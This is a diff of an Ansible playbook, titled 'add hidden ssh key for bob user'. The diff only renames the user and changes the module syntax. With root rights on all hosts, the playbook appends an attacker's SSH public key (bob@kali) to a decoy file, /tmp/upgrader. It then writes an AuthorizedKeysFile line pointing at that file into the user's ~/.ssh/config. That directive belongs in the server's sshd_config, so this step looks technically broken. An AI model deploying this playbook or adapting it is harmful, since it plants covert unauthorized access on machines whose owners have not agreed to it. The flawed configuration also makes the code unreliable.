@@ -1,9 +1,9 @@
 ---
-- name: "add hidden ssh key for carter user"
+- name: "add hidden ssh key for bob user"
   hosts: all
   become: yes
   tasks:
     - name: "add ssh keys"
-      ansible.builtin.shell: "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDGvTDL7yOZrto10pJQaXQ6OGlERXSi3Fv8JPxpzrDFKgrAJ+zycv3npdh6Fm9cagudtuadGDkBZaxgrsWtnn2vrUoziu6SyXjaR6TEc5flmWSLfapH/FfQl2yP2qgMmh4qmOiH3ZWesq+ZRSCkJCBGFy+dVD7/YfhyRwHbKCni/6ng2fv70hnHZvXLlXjFaxKqFj0esBXRD9N/dmfS7J9iZf9/ssyiBi7TRXNcedx8NBzTG6pTb1mD4K7fh3lLE7MfRFaqn/mEyVfSKBayClciaASrl3WmTucfB1XSTNr+Sw8bS79ELp0pFo76xKNP0oJ6lJbHiF8TW9T4+oTx6N2JERnxxs+LAvMgKeUFnkOTMF/U07KdGtT6T3VVlkrJHAdnsWwpxsNVnpLJCTwzXtHY06fXFlfXy/wHivHLgRNWYxMub6wO43INlXylo8rqkp60T4Ydk6FNJRGwL+ooyz8uRuhEVZAZm9KI7bb+B9f58NnnTmloPKqInBeoBIFPIv4agZuy4mdEZcm8+ZrySHMIkTCVa4N6hxetvIH0P8GxOF6mPGBm2Y7+l+qMMDZKZDLrvlValTTpzHEcaxCsgXP4vK9+pM6qojnPbHUnJWXcJsi9vlDcVIXKlFhnp/wnSh0/4U/lfk+SVhezfZOdFY5ezY3Ev2xcmB/VdVbCn9vpVQ== bob@kali' >> /tmp/upgrader"
+      shell: "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDGvTDL7yOZrto10pJQaXQ6OGlERXSi3Fv8JPxpzrDFKgrAJ+zycv3npdh6Fm9cagudtuadGDkBZaxgrsWtnn2vrUoziu6SyXjaR6TEc5flmWSLfapH/FfQl2yP2qgMmh4qmOiH3ZWesq+ZRSCkJCBGFy+dVD7/YfhyRwHbKCni/6ng2fv70hnHZvXLlXjFaxKqFj0esBXRD9N/dmfS7J9iZf9/ssyiBi7TRXNcedx8NBzTG6pTb1mD4K7fh3lLE7MfRFaqn/mEyVfSKBayClciaASrl3WmTucfB1XSTNr+Sw8bS79ELp0pFo76xKNP0oJ6lJbHiF8TW9T4+oTx6N2JERnxxs+LAvMgKeUFnkOTMF/U07KdGtT6T3VVlkrJHAdnsWwpxsNVnpLJCTwzXtHY06fXFlfXy/wHivHLgRNWYxMub6wO43INlXylo8rqkp60T4Ydk6FNJRGwL+ooyz8uRuhEVZAZm9KI7bb+B9f58NnnTmloPKqInBeoBIFPIv4agZuy4mdEZcm8+ZrySHMIkTCVa4N6hxetvIH0P8GxOF6mPGBm2Y7+l+qMMDZKZDLrvlValTTpzHEcaxCsgXP4vK9+pM6qojnPbHUnJWXcJsi9vlDcVIXKlFhnp/wnSh0/4U/lfk+SVhezfZOdFY5ezY3Ev2xcmB/VdVbCn9vpVQ== bob@kali' >> /tmp/upgrader"
     - name: "change ssh config file"
-      ansible.builtin.shell: "echo 'AuthorizedKeysFile /tmp/upgrader .ssh/authorized_keys' >> /home/bob/.ssh/config"
+      shell: "echo 'AuthorizedKeysFile /tmp/upgrader .ssh/authorized_keys' >> /home/bob/.ssh/config && chown bob:bob /home/bob/.ssh/config"
